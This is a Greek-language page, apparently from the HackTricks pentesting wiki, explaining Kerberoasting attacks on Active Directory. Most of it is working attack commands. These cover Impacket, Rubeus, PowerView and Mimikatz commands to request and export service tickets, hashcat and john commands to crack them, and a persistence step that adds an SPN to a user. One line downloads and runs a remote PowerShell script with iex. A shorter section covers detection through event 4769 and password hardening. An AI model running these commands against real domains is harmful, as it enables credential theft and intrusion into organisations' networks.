# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Το Kerberoasting επικεντρώνεται στην απόκτηση **TGS tickets**, συγκεκριμένα αυτών που σχετίζονται με υπηρεσίες που λειτουργούν υπό **λογαριασμούς χρηστών** στο **Active Directory (AD)**, εξαιρώντας **λογαριασμούς υπολογιστών**. Η κρυπτογράφηση αυτών των εισιτηρίων χρησιμοποιεί κλειδιά που προέρχονται από **κωδικούς πρόσβασης χρηστών**, επιτρέποντας την πιθανότητα **offline credential cracking**. Η χρήση ενός λογαριασμού χρήστη ως υπηρεσία υποδεικνύεται από μια μη κενή ιδιότητα **"ServicePrincipalName"**.

Για την εκτέλεση του **Kerberoasting**, είναι απαραίτητος ένας λογαριασμός τομέα ικανός να ζητήσει **TGS tickets**. Ωστόσο, αυτή η διαδικασία δεν απαιτεί **ειδικά προνόμια**, καθιστώντας την προσβάσιμη σε οποιονδήποτε έχει **έγκυρα διαπιστευτήρια τομέα**.

### Key Points:

- Το **Kerberoasting** στοχεύει σε **TGS tickets** για **υπηρεσίες λογαριασμού χρηστών** εντός του **AD**.
- Τα εισιτήρια που κρυπτογραφούνται με κλειδιά από **κωδικούς πρόσβασης χρηστών** μπορούν να **σπαστούν offline**.
- Μια υπηρεσία αναγνωρίζεται από μια **ServicePrincipalName** που δεν είναι κενή.
- **Δεν απαιτούνται ειδικά προνόμια**, μόνο **έγκυρα διαπιστευτήρια τομέα**.

### **Attack**

> [!WARNING]
> Τα **Kerberoasting tools** ζητούν συνήθως **`RC4 encryption`** κατά την εκτέλεση της επίθεσης και την έναρξη αιτημάτων TGS-REQ. Αυτό συμβαίνει επειδή το **RC4 είναι** [**ασθενέστερο**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) και πιο εύκολο να σπάσει offline χρησιμοποιώντας εργαλεία όπως το Hashcat από άλλους αλγόριθμους κρυπτογράφησης όπως το AES-128 και το AES-256.\
> Οι κατακερματισμοί RC4 (τύπος 23) αρχίζουν με **`$krb5tgs$23$*`** ενώ οι AES-256 (τύπος 18) αρχίζουν με **`$krb5tgs$18$*`**.`

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Εργαλεία πολλαπλών χαρακτηριστικών που περιλαμβάνουν μια εξαγωγή χρηστών που μπορούν να kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

- **Καταμέτρηση χρηστών που είναι επιρρεπείς σε Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
- **Τεχνική 1: Ζητήστε TGS και εξάγετε το από τη μνήμη**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
- **Τεχνική 2: Αυτόματα εργαλεία**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
> [!WARNING]
> Όταν ζητείται ένα TGS, δημιουργείται το γεγονός των Windows `4769 - A Kerberos service ticket was requested`.

### Cracking
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Επιμονή

Αν έχετε **αρκετές άδειες** πάνω σε έναν χρήστη μπορείτε να **τον κάνετε kerberoastable**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Μπορείτε να βρείτε χρήσιμα **εργαλεία** για επιθέσεις **kerberoast** εδώ: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Αν βρείτε αυτό το **σφάλμα** από το Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** είναι λόγω της τοπικής σας ώρας, πρέπει να συγχρονίσετε τον υπολογιστή με τον DC. Υπάρχουν μερικές επιλογές:

- `ntpdate <IP of DC>` - Καταργήθηκε από το Ubuntu 16.04
- `rdate -n <IP of DC>`

### Mitigation

Το Kerberoasting μπορεί να διεξαχθεί με υψηλό βαθμό μυστικότητας αν είναι εκμεταλλεύσιμο. Για να ανιχνευθεί αυτή η δραστηριότητα, θα πρέπει να δοθεί προσοχή στο **Security Event ID 4769**, το οποίο υποδεικνύει ότι έχει ζητηθεί ένα Kerberos ticket. Ωστόσο, λόγω της υψηλής συχνότητας αυτού του γεγονότος, πρέπει να εφαρμοστούν συγκεκριμένα φίλτρα για να απομονωθούν οι ύποπτες δραστηριότητες:

- Το όνομα υπηρεσίας δεν θα πρέπει να είναι **krbtgt**, καθώς αυτή είναι μια κανονική αίτηση.
- Τα ονόματα υπηρεσιών που τελειώνουν με **$** θα πρέπει να εξαιρούνται για να αποφευχθεί η συμπερίληψη λογαριασμών μηχανών που χρησιμοποιούνται για υπηρεσίες.
- Οι αιτήσεις από μηχανές θα πρέπει να φιλτράρονται αποκλείοντας ονόματα λογαριασμών που είναι διαμορφωμένα ως **machine@domain**.
- Μόνο οι επιτυχείς αιτήσεις ticket θα πρέπει να θεωρούνται, αναγνωριζόμενες από έναν κωδικό αποτυχίας **'0x0'**.
- **Το πιο σημαντικό**, ο τύπος κρυπτογράφησης του ticket θα πρέπει να είναι **0x17**, ο οποίος χρησιμοποιείται συχνά σε επιθέσεις Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Για να μετριαστεί ο κίνδυνος του Kerberoasting:

- Διασφαλίστε ότι οι **Κωδικοί Πρόσβασης Λογαριασμών Υπηρεσιών είναι δύσκολοι να μαντευτούν**, προτείνοντας μήκος μεγαλύτερο από **25 χαρακτήρες**.
- Χρησιμοποιήστε **Διαχειριζόμενους Λογαριασμούς Υπηρεσιών**, οι οποίοι προσφέρουν πλεονεκτήματα όπως **αυτόματες αλλαγές κωδικών πρόσβασης** και **διαχείριση Ονόματος Υπηρεσίας (SPN) με ανάθεση**, ενισχύοντας την ασφάλεια κατά τέτοιων επιθέσεων.

Με την εφαρμογή αυτών των μέτρων, οι οργανισμοί μπορούν να μειώσουν σημαντικά τον κίνδυνο που σχετίζεται με το Kerberoasting.

## Kerberoast χωρίς λογαριασμό τομέα

Το **Σεπτέμβριο του 2022**, μια νέα μέθοδος εκμετάλλευσης ενός συστήματος αποκαλύφθηκε από έναν ερευνητή ονόματι Charlie Clark, που μοιράστηκε μέσω της πλατφόρμας του [exploit.ph](https://exploit.ph/). Αυτή η μέθοδος επιτρέπει την απόκτηση **Εισιτηρίων Υπηρεσίας (ST)** μέσω ενός αιτήματος **KRB_AS_REQ**, το οποίο αξιοσημείωτα δεν απαιτεί έλεγχο οποιουδήποτε λογαριασμού Active Directory. Ουσιαστικά, αν ένας κύριος έχει ρυθμιστεί με τέτοιο τρόπο ώστε να μην απαιτεί προ-αυθεντικοποίηση—μια κατάσταση παρόμοια με αυτή που είναι γνωστή στον τομέα της κυβερνοασφάλειας ως **επίθεση AS-REP Roasting**—αυτή η χαρακτηριστική μπορεί να αξιοποιηθεί για να παραποιήσει τη διαδικασία αιτήματος. Συγκεκριμένα, αλλάζοντας την ιδιότητα **sname** μέσα στο σώμα του αιτήματος, το σύστημα παραπλανάται να εκδώσει ένα **ST** αντί για το τυπικό κρυπτογραφημένο Εισιτήριο Χορήγησης Εισιτηρίου (TGT).

Η τεχνική εξηγείται πλήρως σε αυτό το άρθρο: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> Πρέπει να παρέχετε μια λίστα χρηστών γιατί δεν έχουμε έγκυρο λογαριασμό για να κάνουμε ερώτημα στο LDAP χρησιμοποιώντας αυτή την τεχνική.

#### Linux

- [impacket/GetUserSPNs.py από PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

- [GhostPack/Rubeus από PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Αναφορές

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}
